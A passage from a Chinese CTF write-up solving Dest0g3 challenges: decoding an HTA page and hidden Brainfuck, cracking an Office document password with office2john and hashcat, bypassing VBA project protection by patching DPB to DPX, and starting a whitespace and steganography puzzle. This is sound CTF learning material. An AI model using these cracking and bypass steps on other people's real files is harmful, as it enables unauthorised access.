class="hljs-variable">%221</span>.<span class="hljs-number">0</span><span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>SCROLL<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>no<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>Cstyle<span class="hljs-variable">%20</span><span class="hljs-keyword">type</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>text<span class="hljs-variable">%2</span>Fcss<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fhead<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Cdiv<span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>feature<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Cdiv<span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>content<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fstyle<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>Ch<span class="hljs-number">1</span><span class="hljs-variable">%20</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>unavailable<span class="hljs-variable">%22</span><span class="hljs-variable">%20</span>class<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>loading<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>EBuilding<span class="hljs-variable">%20</span>js.....<span class="hljs-variable">%3</span>C<span class="hljs-variable">%2</span>Fh<span class="hljs-number">1</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%3</span>Cscript<span class="hljs-variable">%20</span><span class="hljs-keyword">type</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>text<span class="hljs-variable">%2</span>Fjavascript<span class="hljs-variable">%22</span><span class="hljs-variable">%20</span>language<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>javascript<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span>function<span class="hljs-variable">%20</span>RunFile<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>var<span class="hljs-variable">%20</span>WshShell<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>new<span class="hljs-variable">%20</span>ActiveXObject<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>WScript.Shell<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span><span class="hljs-variable">%09</span>WshShell.Run<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>notepad<span class="hljs-variable">%20</span><span class="hljs-variable">%25</span>windir<span class="hljs-variable">%25</span><span class="hljs-variable">%2</span>FDesktop<span class="hljs-variable">%2</span>Fjs.txt<span class="hljs-variable">%22</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%201</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%20</span><span class="hljs-keyword">false</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>F*<span class="hljs-variable">%20</span>var<span class="hljs-variable">%20</span>oExec<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span>WshShell.Exec<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>notepad<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%20</span>*<span class="hljs-variable">%2</span><br></code></pre></td></tr></table></figure><p>可以看到有一个script标签。我们把其他数据段也提出来，进行解码，然后只关注script标签部分。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-built_in">unescape</span>(<span class="hljs-string">&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;</span>));</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>中间的代码提取出来。打开浏览器的开发模式，在控制台里面把中间代码敲上。</p><p>界面出现了一些元素。翻找页面元素。发现了一个p标签颜色是白色的，由于背景也是白的，所以在我们这算是不可见。打开看看。里面是brainfuck的代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- <br>-.-.- --.++ ++++.<br>+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- <br>&gt;---&lt; ]&gt;--- ---.+ ++++. -----<br>.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.<br>&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+<br> +++++ .---- -.++. ++.+.<br>--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- <br>.+.-. ---.+ ++.+. -.+++<br>+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---<br>-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ <br>.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.<br>+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ <br>.---- .+.++ ++.-- --.++<br>++.-. ----. +.-.+ ++++. <br>&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;<br></code></pre></td></tr></table></figure><p>解码得到：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D<br></code></pre></td></tr></table></figure><p>十六进制转换为字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-number">0x446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</span>))<br><br><span class="hljs-comment"># Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</span><br></code></pre></td></tr></table></figure><h2 id="easyword"><a class="markdownIt-Anchor" href="#easyword"></a> EasyWord</h2><p>用hashcat对password.docm进行爆破。</p><p>首先提取文件的hash。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/CTF/Dest0g]<br>└─$ office2john password.docm <br>password.docm:$office$*2010*100000*128*16*d135d71212d659473f2b5fb4bf46d78e*e0a8853d6d0c42cafd62c82dda2fbc6e*d0889853485e2aeb49c06a1d3d691fc81ffb42a35f97c83d0ed5c646066f4ab1<br></code></pre></td></tr></table></figure><p>得到输出去掉前面的文件名写入到文件里。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">10600</span> | PDF <span class="hljs-number">1</span>.<span class="hljs-number">7</span> Level <span class="hljs-number">3</span> (Acrobat <span class="hljs-number">9</span>)                      | Documents<br><span class="hljs-attribute">10700</span> | PDF <span class="hljs-number">1</span>.<span class="hljs-number">7</span> Level <span class="hljs-number">8</span> (Acrobat <span class="hljs-number">10</span> - <span class="hljs-number">11</span>)                | Documents<br> <span class="hljs-attribute">9400</span> | MS Office <span class="hljs-number">2007</span>                                   | Documents<br> <span class="hljs-attribute">9500</span> | MS Office <span class="hljs-number">2010</span>                                   | Documents<br> <span class="hljs-attribute">9600</span> | MS Office <span class="hljs-number">2013</span>                                   | Documents<br> <span class="hljs-attribute">9700</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4               | Documents<br> <span class="hljs-attribute">9710</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4, collider #<span class="hljs-number">1</span>  | Documents<br> <span class="hljs-attribute">9720</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">0</span>/$<span class="hljs-number">1</span>, MD5 + RC4, collider #<span class="hljs-number">2</span>  | Documents<br> <span class="hljs-attribute">9800</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>/$<span class="hljs-number">4</span>, SHA1 + RC4              | Documents<br> <span class="hljs-attribute">9810</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>, SHA1 + RC4, collider #<span class="hljs-number">1</span>    | Documents<br> <span class="hljs-attribute">9820</span> | MS Office &lt;= <span class="hljs-number">2003</span> $<span class="hljs-number">3</span>, SHA1 + RC4, collider #<span class="hljs-number">2</span>    | Documents<br><br></code></pre></td></tr></table></figure><p>我们得到hash头是office2010，type为9500。</p><p>hint中提示密码为：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">The length <span class="hljs-keyword">of</span> docm &#x27;s password <span class="hljs-keyword">is</span> 6<br>The Regular Expression <span class="hljs-keyword">of</span> the password <span class="hljs-keyword">is</span>:<br><span class="hljs-comment">[a-z]</span> <span class="hljs-comment">[a-z]</span> q <span class="hljs-comment">[a-z]</span> b <span class="hljs-comment">[a-z]</span><br></code></pre></td></tr></table></figure><p>采用掩码爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/CTF/Dest0g]<br>└─$ hashcat docxhash -a 3 -m 9500 ?l?lq?lb?l<br>...<br>...<br>$office$*2010*100000*128*16*d135d71212d659473f2b5fb4bf46d78e*e0a8853d6d0c42cafd62c82dda2fbc6e*d0889853485e2aeb49c06a1d3d691fc81ffb42a35f97c83d0ed5c646066f4ab1:ulqsbt<br>                                                 <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Name........: MS Office 2010<br>Hash.Target......: $office$*2010*100000*128*16*d135d71212d659473f2b5fb...6f4ab1<br>Time.Started.....: Mon May 23 14:56:52 2022 (4 mins, 53 secs)<br>Time.Estimated...: Mon May 23 15:01:45 2022 (0 secs)<br>Guess.Mask.......: ?l?lq?lb?l [6]<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:     1439 H/s (13.85ms) @ Accel:1024 Loops:512 Thr:1 Vec:8</span><br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 421888/456976 (92.32%)<br>Rejected.........: 0/421888 (0.00%)<br>Restore.Point....: 12288/17576 (69.91%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:24-25 Iteration:0-1</span><br>Candidates.<span class="hljs-comment">#1....: udqabt -&gt; uiqebx</span><br><br><span class="hljs-comment"># ulqsbt</span><br></code></pre></td></tr></table></figure><p>得到密码为ulqsbt。但是我的word不知道为什么打不开这个文档。没辙了，我也懒得下其他office。</p><p>后面发现是WindowsDefender给我拦了…</p><p>打开文件，运行宏，弹出一个对话框。要求输入对应的口令。但是咱不知道口令。看看VBA的代码吧。结果VBA的代码是加密的，服了。52上面找到了如何破解。</p><p>首先另存为这个docm文件。将新保存的文件用zip打开。找到word/vbaProject.bin。取出来用二进制查看器打开。查找文件中的&quot;DPB&quot;字符串。将其修改为“DPX”</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">DPB</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;6A68C60DC22AC22A3DD6C32A01D8603CA71D723AE102E0FFC37E6C3974F6CB68433CB3841C&quot;</span><br>TO：<br><span class="hljs-attribute">DPX</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;6A68C60DC22AC22A3DD6C32A01D8603CA71D723AE102E0FFC37E6C3974F6CB68433CB3841C&quot;</span><br></code></pre></td></tr></table></figure><p>保存之后，重新改为docm文件。打开，这样我们就能打开对应的project了。</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Private</span> <span class="hljs-keyword">Sub</span> CB_OK_Click()<br><span class="hljs-keyword">Dim</span> strpasw <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> strdec <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> strusrinput <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><span class="hljs-keyword">Dim</span> t <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>t = ChrW(<span class="hljs-number">21152</span>) &amp; ChrW(<span class="hljs-number">27833</span>) &amp; ChrW(<span class="hljs-number">21543</span>) &amp; ChrW(<span class="hljs-number">65292</span>) &amp; ChrW(<span class="hljs-number">21516</span>) &amp; ChrW(<span class="hljs-number">23398</span>) &amp; ChrW(<span class="hljs-number">20204</span>) &amp; ChrW(<span class="hljs-number">65281</span>)<br><br>strusrinput = Dialog.TextBox_Pasw<br><span class="hljs-keyword">Dim</span> sinput <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>sinput = strusrinput<br><br><span class="hljs-keyword">If</span> (strusrinput &lt;&gt; <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">Then</span><br>  strusout = Encode(strusrinput, t)<br>  <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;┤℡ǒqｘ~&quot;</span>) <span class="hljs-keyword">Then</span><br>      strdec = Decode(Dialog.Label_ls.Caption, sinput)<br>  <span class="hljs-keyword">Else</span><br>     <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;ｋGJEｇｑ&quot;</span>) <span class="hljs-keyword">Then</span><br>        strdec = Decode(Dialog.Label_ls1.Caption, sinput)<br>     <span class="hljs-keyword">Else</span><br>          <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;ЮΟopz+&quot;</span>) <span class="hljs-keyword">Then</span><br>             strdec = Decode(Dialog.Label_ls2.Caption, sinput)<br>          <span class="hljs-keyword">Else</span><br>                <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;ｚΚjrШφεあ&quot;</span>) <span class="hljs-keyword">Then</span><br>                    strdec = Decode(Dialog.Label_ls4.Caption, sinput)<br>                <span class="hljs-keyword">Else</span><br>                    <span class="hljs-keyword">If</span> (strusout = <span class="hljs-string">&quot;àǖtＵｗ┧ｈè&quot;</span>) <span class="hljs-keyword">Then</span><br>                          strdec = Decode(Dialog.Label_ls3.Caption, sinput)<br>                    <span class="hljs-keyword">Else</span><br>                          strdec = <span class="hljs-string">&quot;密码不正确,别泄气再来!&quot;</span><br>                    <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>                <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>           <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>      <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>   <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>   Label_CLUE.Caption = strdec<br><span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure><p>只要看这个按钮事件即可。</p><p>这里面要判断我们的输入是否满足要求。</p><p>我们的字符串首先进入了Encode编码了一下。而且用的是固定密钥，所以我们直接Decode对应的目标字符串就能得到我们想要的输入是什么。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-string">&quot;┤℡ǒqｘ~&quot;</span> : 123456<br><span class="hljs-string">&quot;ｋGJEｇｑ&quot;</span> : <span class="hljs-type">aaaaaa</span><br><span class="hljs-string">&quot;ЮΟopz+&quot;</span> : 000000<br><span class="hljs-string">&quot;ｚΚjrШφεあ&quot;</span> : 墙角数枝<br><span class="hljs-string">&quot;àǖtＵｗ┧ｈè&quot;</span> : <span class="hljs-type">iloveyou</span><br></code></pre></td></tr></table></figure><p>以上是对应的字符串所需要输入的数据。</p><p>依次尝试，只有“墙角数枝”给出了提示：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">解压密码:两只黄鹂鸣翠柳,一行白鹭上青天!<br></code></pre></td></tr></table></figure><p>Rar密码为复杂型，长度为16位，包含了字母、数字和符号。这一行诗加上符号刚好16位。我觉得就是把这句诗首字母提出来就行了，加上符号。由于要有数字，所以一改为1，两改为2。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>hblsqt!<br></code></pre></td></tr></table></figure><p>发现不对，又换了其他的密码。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2ZHLMCL</span>,<span class="hljs-number">1</span>HBLSQT!<br><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>HBLSQT!<br><span class="hljs-attribute">2ZHLMCL</span>,<span class="hljs-number">1</span>hblsqt!<br></code></pre></td></tr></table></figure><p>这些都不对，奇了怪了…</p><p>最后写了个脚本把所有大小写都爆破一遍，还是不行…</p><p>最后把这个小问题给了我队友，结果给他解出来了。密码是：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2zhlmcl</span>,<span class="hljs-number">1</span>hblsqt.<br></code></pre></td></tr></table></figure><p>给我干沉默了…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Dest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;</span><br></code></pre></td></tr></table></figure><h2 id="python_jail"><a class="markdownIt-Anchor" href="#python_jail"></a> Python_jail</h2><p>解压之后，有个压缩包要密码，然后有一个password和hint。看了一下password，全是空白字符，以为是SNOW隐写，但是hint里面说是一种语言，所以应该是white_space语言。</p><p><a href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a></p><p>将password里面的数据导入，点击右上角的Run运行。得到密码:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a8e15220</span>-<span class="hljs-number">7404</span>-<span class="hljs-number">4269</span>-<span class="hljs-number">812</span>e-<span class="hljs-number">6418557</span>b7dc2<br></code></pre></td></tr></table></figure><p>解压得到一张图片。</p><p>LSB提取有些信息比较令人注意。在三通道LSB下:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">e99881e59ca8e8bf 99e9878c5a6d7868  <span class="hljs-string">........</span> <span class="hljs-string">....Zmxh</span><br>5a3374694e574a6a 5a6d4d344e793031  Z3tiNWJj ZmM4Ny01<br>593245324c54517a 5a6a4574596a4d34  Y2E2LTQz ZjEtYjM4<br>4e4330314e325177 4f5749344f445a6a  NC01N2Qw OWI4ODZj<br>59546c3975230000 00e7949fe68890e6  YTl9u<span class="hljs-comment">#.. ........</span><br>8890e58a9f0a4669 6e6420697420696e  <span class="hljs-string">......Fi</span> nd it in<br>20796f757220666f 6c6465724e2904da   your fo lderN)<span class="hljs-string">..</span><br>046f70656eda0466 696c65da05777269  <span class="hljs-string">.open..f</span> ile.<span 